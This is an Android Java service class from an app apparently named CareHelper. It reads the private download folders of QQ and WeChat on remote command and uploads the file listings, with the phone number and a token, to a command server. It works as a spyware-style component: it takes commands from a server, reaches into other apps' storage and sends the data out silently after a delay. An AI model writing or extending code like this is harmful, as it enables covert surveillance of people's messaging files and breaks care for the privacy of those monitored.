package org.bert.carehelper.service;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import androidx.documentfile.provider.DocumentFile;
import androidx.fragment.app.FragmentActivity;

import com.alibaba.fastjson2.JSON;
import com.tencent.map.geolocation.TencentLocationManager;

import org.bert.carehelper.common.API;
import org.bert.carehelper.common.CareHelperContext;
import org.bert.carehelper.common.CareHelperEnvironment;
import org.bert.carehelper.common.CommandType;
import org.bert.carehelper.common.FileUrlUtils;
import org.bert.carehelper.entity.CommandResponse;
import org.bert.carehelper.http.HTTPConnection;

import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ThreadPoolExecutor;


public class FileService implements Service {
    private Context context;

    private final String TAG = "FileService";

    private String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/";

    private FragmentActivity activity;

    protected Map<String, DocumentFile> fileMap;

    private CareHelperContext cContext = CareHelperContext.getInstance();

    private ThreadPoolExecutor threadPool = null;


    public FileService(Context context, FragmentActivity activity) {
        this.context = context;
        this.activity = activity;
        this.threadPool = cContext.getThreadPoolExecutor();
        if (!FileUrlUtils.isGrant$File(this.context)) {
            // 获取读写权限
            FileUrlUtils.startForRoot$Data(this.activity, 1);
            // 设置返回Code
            CareHelperEnvironment.getInstance().setRequestCode(1);
            FileUrlUtils.startForRoot$File(this.activity, 1);
        }

        this.fileMap = new HashMap<>();
    }

    /**
     * 获取所有的APP对象
     */
    public void readAllAppFiles() throws FileNotFoundException {
        DocumentFile[] files = (DocumentFile[]) FileUrlUtils.getFileLists(CareHelperEnvironment.getInstance().getActivity(), path);
        this.fileMap = parseAppFiles(files);
    }

    /**
     * 读取QQ下载的文件目录
     */
    public Map<String, DocumentFile> getQQRecvFiles() {
        DocumentFile qqFile = this.fileMap.get("com.tencent.mobileqq");
        if (qqFile != null) {
            DocumentFile[] appFiles = qqFile.listFiles();
            Map<String, DocumentFile> qqFileMap = parseAppFiles(appFiles);
            DocumentFile tencentFile = qqFileMap.get("Tencent");
            if (tencentFile != null) {
                Map<String, DocumentFile> tencentFileMap = parseAppFiles(tencentFile.listFiles());
                DocumentFile fileRecv = tencentFileMap.get("QQfile_recv");
                if (fileRecv != null) {
                    return parseAppFiles(fileRecv.listFiles());
                }
            }
        }
        return null;
    }

    /**
     * 读取wechat文件列表
     */
    public Map<String, DocumentFile> getWechatFiles() {
        DocumentFile wechatFolder = this.fileMap.get("com.tencent.mm");
        if (wechatFolder != null) {
            DocumentFile[] appFiles = wechatFolder.listFiles();
            Map<String, DocumentFile> wechatFileMap = parseAppFiles(appFiles);
            DocumentFile msgFile = wechatFileMap.get("MicroMsg");
            if (msgFile != null) {
                Map<String, DocumentFile> msgFileMap = parseAppFiles(msgFile.listFiles());
                DocumentFile downloadFile = msgFileMap.get("Download");
                if (downloadFile != null) {
                    return parseAppFiles(downloadFile.listFiles());
                }
            }
        }
        return null;
    }

    private Map<String, DocumentFile> parseAppFiles(DocumentFile[] appFiles) {
        Map<String, DocumentFile> fileMap = new HashMap<>();
        for (int i = 0; i < appFiles.length; i++) {
            DocumentFile file = appFiles[i];
            fileMap.put(file.getName(), file);
        }
        return fileMap;
    }

    @Override
    public CommandResponse doCommand(String type) {

        CommandResponse response = new CommandResponse();
        response.setPhone(this.cContext.getPhone());
        response.setToken(this.cContext.getEnvironment().getToken());
        String[] strings = type.split(":");
        if (strings.length < 2) {
            Log.e(TAG, "commands error!");
            return response;
        }
        switch (strings[1]) {
            case CommandType.QQ:
                Map<String, DocumentFile> qq = this.getQQRecvFiles();
                String qqJsonStr = JSON.toJSONString(qq.keySet());
                response.setStatus(0);
                response.setMessage(qqJsonStr);
                this.syncData(response);
                break;
            case CommandType.WE:
                Map<String, DocumentFile> we = this.getWechatFiles();
                String weJsonStr = JSON.toJSONString(we.keySet());
                response.setStatus(0);
                response.setMessage(weJsonStr);
                this.syncData(response);
                break;
        }
        return response;
    }

    private void syncData(CommandResponse response) {
        try {
            Log.i(TAG, "commands exec success, wait 4 sec to do upload task!");
            Thread.sleep(4000);
            this.threadPool.execute(()->{
                Log.i(TAG, "doing upload task！");
                new HTTPConnection(
                        API.API_COMMAND + "/receive",
                        response,
                        "POST"
                ).run();
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
